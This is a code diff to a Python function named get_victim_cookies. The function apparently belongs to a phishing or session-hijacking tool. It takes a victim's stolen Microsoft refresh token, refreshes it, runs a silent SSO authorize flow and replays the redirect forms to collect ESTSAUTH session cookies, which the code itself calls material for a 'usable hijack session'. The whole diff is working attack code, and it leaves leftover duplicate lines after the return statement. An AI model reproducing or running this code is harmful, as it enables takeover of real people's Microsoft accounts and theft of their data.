@@ -180,16 +180,16 @@ def decode_id_token(id_token):
 # ---------------------------------------
 def get_victim_cookies(refresh_token, client_id, email):
     """
-    Refreshes the token and performs an SSO authorize round-trip to mint
-    ESTSAUTH cookies. Handles form_post redirects manually.
+    Refreshes the token and performs a completed SSO authorize round-trip
+    to mint ESTSAUTH / ESTSAUTHPERSISTENT session cookies.
     """
     try:
         s = requests.Session()
         s.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
         })
-        
-        # Step 1: Refresh Token
+
+        # Step 1: Refresh the token (keeps session alive and valid)
         r = s.post(
             f"{UPSTREAM}/common/oauth2/v2.0/token",
             data={
@@ -205,6 +205,62 @@ def get_victim_cookies(refresh_token, client_id, email):
             print("[COOKIES] refresh failed:", data.get("error"), data.get("error_description", "")[:200])
             return None
 
+        # Step 2: SSO Authorize with prompt=none so it auto-completes silently
+        nonce = uuid.uuid4().hex
+        auth_url = (
+            f"{UPSTREAM}/common/oauth2/authorize?"
+            f"client_id={client_id}&response_type=id_token"
+            f"&redirect_uri=https%3A%2F%2Flogin.microsoftonline.com%2Fcommon%2Foauth2%2Fnativeclient"
+            f"&scope=openid&response_mode=form_post&prompt=none&nonce={nonce}"
+            f"&login_hint={email}"
+        )
+        resp = s.get(auth_url, timeout=25, allow_redirects=True)
+
+        # Step 3: Follow chained form_post redirects manually.
+        # Microsoft returns HTML pages with auto-submitting <form> tags.
+        for _ in range(8):
+            m = re.search(
+                r'<form[^>]*action=["\']([^"\']+)["\'][^>]*>(.*?)</form>',
+                resp.text, re.IGNORECASE | re.DOTALL
+            )
+            if not m:
+                break
+            action = m.group(1).replace("&amp;", "&")
+            fields = {}
+            for inp in re.findall(r"<input[^>]*>", m.group(2), re.IGNORECASE):
+                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.IGNORECASE)
+                if not name_m:
+                    continue
+                val_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.IGNORECASE)
+                fields[name_m.group(1)] = val_m.group(1) if val_m else ""
+            if not fields:
+                break
+            resp = s.post(action, data=fields, timeout=25, allow_redirects=True)
+
+        # Step 4: Hit the root login page once more to sweep up
+        # any remaining session cookies (ESTSAUTHLIGHT, cltm, etc.)
+        try:
+            s.get(f"{UPSTREAM}/", timeout=20)
+        except Exception:
+            pass
+
+        # Step 5: Collect the wanted cookies
+        cookies = {}
+        for c in s.cookies:
+            if c.name in COOKIE_WANTED and c.value:
+                cookies[c.name] = c.value
+
+        # Must have at least one ESTSAUTH* cookie for a usable hijack session
+        auth_cookies = [k for k in cookies if k.startswith("ESTSAUTH")]
+        if not auth_cookies:
+            print("[COOKIES] no ESTSAUTH cookies captured - got:", list(cookies.keys()))
+            return cookies if cookies else None
+
+        print(f"[COOKIES] captured {len(cookies)} cookies incl. {auth_cookies}")
+        return cookies
+    except Exception as e:
+        print(f"[COOKIES] exception: {e}")
+        return None
         # Step 2: SSO Authorize (trigger cookie issuance)
         nonce = uuid.uuid4().hex
         auth_url = (
